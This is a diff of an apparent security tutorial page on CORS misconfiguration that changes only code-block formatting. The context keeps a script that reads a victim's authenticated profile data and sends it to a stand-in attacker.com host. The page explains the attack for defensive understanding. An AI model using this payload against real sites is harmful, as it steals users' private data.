@@ -47,7 +47,7 @@ If the response includes `Access-Control-Allow-Credentials: true`, the `Access-C
 
 If the server reflects any `Origin` and allows credentials, an attacker can read authenticated data from a victim's browser:
 
-{% highlight html %}
+```html
 <script>
 fetch('https://victim.com/api/profile', {credentials: 'include'})
   .then(r => r.json())
@@ -56,7 +56,7 @@ fetch('https://victim.com/api/profile', {credentials: 'include'})
     new Image().src = 'https://attacker.com/steal?data=' + JSON.stringify(data);
   });
 </script>
-{% endhighlight %}
+```
 
 When the victim visits the attacker's page, the browser sends the request with the victim's cookies, and — because the server reflects the origin — the attacker can read the response.
 
